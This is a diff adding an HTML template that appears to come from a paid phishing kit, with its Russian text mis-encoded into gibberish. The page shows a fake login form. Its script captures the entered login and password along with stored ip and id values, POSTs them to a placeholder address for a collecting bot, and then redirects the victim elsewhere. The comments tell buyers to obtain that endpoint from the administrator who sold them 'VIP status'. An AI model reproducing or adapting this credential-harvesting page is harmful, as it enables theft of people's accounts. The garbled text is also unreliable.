@@ -1,0 +1,64 @@
+<doctype htm>
+
+<html>
+<body>
+<center><br>
+<br>
+<br>
+<h1>б щрс оюойс мсфмн гюйхмсрэ бюь .HTML яюир!<h1>
+<br>
+<h2>педюйрхпсире  бюь HTML</h2>
+мюундхл цде б бюьел йнде ббнд кнцхмю х оюпнкъ с йюфднцн ьюакнмю он дпсцнлс
+бярюбъкел рсдю опхлепш йнрнпше онйюгюмш мхфе<BR>
+<H1><b>id="lgn" id="psw" id="btn"<b><H1>
+
+<!--------------- яЙПХОР ДКЪ ПЕДЮЙРХПНБЮМХЕ ЬЮАКНМЮ ----------------->
+<form>
+
+<input id="lgn" placeholder="рср кнцхм"></input>
+      <br>
+         <input id="psw" type="password" placeholder="рср оюпнкэ"></input>
+               <br>
+                   <br>
+                       <button id="btn">йМНОЙЮ ДКЪ ЮБРНПХГЮЖХХ / БУНД</button>
+</form>
+<!------------------------------------------------------------------->
+
+
+
+
+<!---------- дЮММШИ ЯЙПХОР АСДЕР ОЕПЕДЮБЮРЭ ДЮММШЕ Б АНРЮ --------------->
+
+<script> document.querySelector('#btn').addEventListener('click', async function (e) {
+      e.preventDefault()
+let r = await fetch('йнд гюопняхре с юдлхмхярпюрнпю с йнрнпнцн онйсоюкх бхо ярюрся', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: document.querySelector('#lgn').value,
+                    password: document.querySelector('#psw').value,
+                    fake: new URL(location.href).origin,
+                    ip: localStorage.getItem('ip'),
+                    id: localStorage.getItem('id'),
+                    query: localStorage.getItem('num'),
+                    type: 'еые 1 йнд йнрнпши менаундхлн гюопняхрэ с юдлхмхярпюрнпю'
+                })
+            }).then(data => {
+                setTimeout(() => {
+                   location.replace('https://ПЕДХПЕЙР.ПС/')
+                }, 500)
+            })
+    })
+  </script>
+  
+<!------------------------------------------------------------------------>
+
+
+
+
+
+</center>
+</body>
+</html>
